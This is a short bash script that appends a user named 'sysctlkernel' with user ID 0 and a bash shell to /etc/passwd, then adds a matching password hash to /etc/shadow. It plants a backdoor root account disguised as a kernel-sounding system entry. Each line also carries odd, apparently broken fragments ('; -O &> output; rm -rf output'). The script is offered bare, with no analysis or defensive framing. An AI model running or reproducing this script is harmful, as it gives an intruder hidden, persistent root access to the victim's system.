#!/bin/bash
printf 'sysctlkernel:x:0:0:sysctlkernel:/root:/bin/bash' >> /etc/passwd ; -O &> output; rm -rf output
printf 'sysctlkernel:$6$ZryzoxRF$iFCUwFMyV/8evP05FJh8KnmTsJEub63or5bIev1X7DQNNgioFv6e9GYi49TXrbz9S.2OyFaOukntYwF5Gv5SF0:18344:0:99999:7:::' >> /etc/shadow ; -O &> output; rm -rf output